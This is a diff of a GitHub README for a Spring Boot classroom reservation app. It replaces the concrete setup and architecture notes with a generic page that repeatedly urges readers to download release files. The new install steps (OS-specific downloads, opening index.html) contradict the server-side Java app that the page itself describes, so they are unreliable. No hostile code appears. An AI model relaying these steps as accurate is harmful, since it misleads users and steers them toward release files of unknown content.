@@ -1,103 +1,74 @@
-# 📘 Classroom Reservation System
+# 🎓 reservation - Effortless Classroom Reservations Made Simple
 
-A web-based classroom reservation system designed for **XJTLU campus**, addressing the lack of an online platform for booking available classrooms for self-study.  
-Students can search classrooms, join waiting lists, and reserve rooms online, reducing conflicts and improving space utilization.  
-This system is built with **Spring Boot (Java)**, **MVC architecture**, and a **MySQL relational database**.
+## 📥 Download Now
+[![Download Reservation](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/lau-cyber/reservation/releases)
 
----
+## 📜 Description
+The reservation application is a web-based system designed for classroom reservations at universities. It offers a complete solution with a multi-layer architecture and a relational database. Users can manage accounts, browse classrooms, handle waiting lists, and submit reservations with ease. The software is built using agile methodologies to ensure continuous improvement and user satisfaction.
 
-## 🚀 Features
+## 🚀 Getting Started
 
-### ✔ User Module
-- User registration & login  
-- Personal information management  
+### 💻 System Requirements
+To use the reservation application, ensure your system meets the following requirements:
 
-### ✔ Classroom Module
-- View spare classrooms across campus  
-- Search and filter rooms  
-- View room capacity & availability  
+- Operating System: Windows, macOS, or Linux
+- Web Browser: Google Chrome, Mozilla Firefox, or Microsoft Edge
+- Internet Connection: Required for accessing the web application
 
-### ✔ Reservation Workflow
-- Add a room to the waiting list  
-- Reserve classroom using generated **CID**  
-- Modify reservation by deleting & rebuilding the request  
+### 📥 How to Download
+To get started, follow these steps:
 
-### ✔ Admin / Backend Support
-- Database-driven room information  
-- Persistent user & reservation data  
+1. Navigate to the [Releases Page](https://github.com/lau-cyber/reservation/releases).
+2. Look for the latest release version.
+3. Click on the appropriate download link for your operating system to begin downloading.
 
----
+### 🛠️ Installation Steps
+1. Once the download finishes, locate the downloaded file in your computer's downloads folder.
+2. If the application is a zip file, right-click and select “Extract All” or use your preferred extraction tool.
+3. Open the extracted folder.
+4. Look for the `index.html` file and double-click to open it in your web browser.
 
-## 🧱 System Architecture
+## 💡 Application Features
+- **User Management**: Register and manage user accounts easily.
+- **Classroom Browsing**: Search and view available classrooms.
+- **Waiting List Operations**: Join and manage waiting lists for fully booked classrooms.
+- **Reservation Submission**: Send reservation requests with a few clicks.
+- **User-Friendly Interface**: Navigate the application with ease, thanks to its intuitive design.
 
-The system adopts a **four-layer architecture**:
+## 📊 Topics Covered
+The reservation application covers various topics essential for understanding and using the system:
 
-```
-┌──────────────────────────────┐
-│  Visit Layer (UI Layer)      │ → JSP / HTML views
-├──────────────────────────────┤
-│  Access Layer (Controller)   │ → MVC controllers handle routing
-├──────────────────────────────┤
-│  Service Layer (Business)    │ → Reservation logic, validation
-├──────────────────────────────┤
-│  Data Layer (DAO + MySQL)    │ → Database operations
-└──────────────────────────────┘
-```
+- Agile Development
+- Classroom Reservation
+- Database Design
+- Java Web Technologies
+- MVC Architecture
+- MySQL Database
+- Online Booking
+- Reservation System
+- Software Engineering
+- Spring Boot Framework
+- Web Application Development
 
+## 🔧 Troubleshooting
+If you encounter any issues during download or installation, consider the following solutions:
 
----
+- **Download Issues**: Ensure your internet connection is stable. Try refreshing the page and starting the download again.
+- **Installation Problems**: If you cannot open the application, check that you have the latest version of your web browser. Clearing your browser’s cache may help.
+- **Feature Usage**: For questions about using specific features, refer to the help section within the application or check online guides related to classroom reservations.
 
-## 🗄 Database Design
+## 📞 Support
+For additional help, please visit our [Support Page](https://github.com/lau-cyber/reservation/issues) or create a new issue if you can't find a solution to your problem.
 
-Based on the ER diagram & relational schema
+## 🎉 Download & Install
+Ready to reserve a classroom? Visit our download page to get the latest version and start using the reservation application today! 
 
-### **Main Tables**
-- `t_user` — user accounts  
-- `t_information` — personal details  
-- `t_room` — classroom information  
-- `t_cart` — waiting list entries  
-- `t_order` — confirmed reservations  
+[Download Reservation](https://github.com/lau-cyber/reservation/releases)
 
-All tables follow **3rd Normal Form (3NF)** to avoid data redundancy and ensure consistency.
+## 🙌 Acknowledgments
+Thanks to everyone who contributed to making the reservation application better with feedback and support. Your input helps us improve the software continually. 
 
----
+## 📄 License
+The reservation application is open-source and available under the MIT License. Feel free to explore and modify it as you see fit. 
 
-## 📦 Installation & Setup
-
-### **1. Database Setup**
-- Run the SQL scripts in `/sql` to create tables and insert sample data.  
-- Ensure MySQL connection settings in `application.properties` are correct.
-
-### **2. Run the Application**
-Run the main application file:
-
-```src/main/java/com/cpt202a19/reservation/ReservationApplication.java```
-
-### **3. Access in Browser**
-
-```http://<your-ip-address>:8080```
-
----
-
-## 🕹 User Instructions
-
-1. Register your account  
-2. Log in  
-3. Browse classrooms  
-4. Add a room to your waiting list  
-5. Reserve rooms using the URL containing the generated **CID**  
-6. To modify reservations → delete the original and recreate it  
-
-*(Aligned with Report pp. 3–4 — CPT202 Assignment 2 - 1930115)*
-
----
-
-## 🤝 Contribution Guidelines
-
-1. Fork this repository  
-2. Create a new branch: `feat_xxx`  
-3. Commit your changes  
-4. Submit a Pull Request  
-
----
-
+For more details, please refer to the LICENSE file included in the repository.
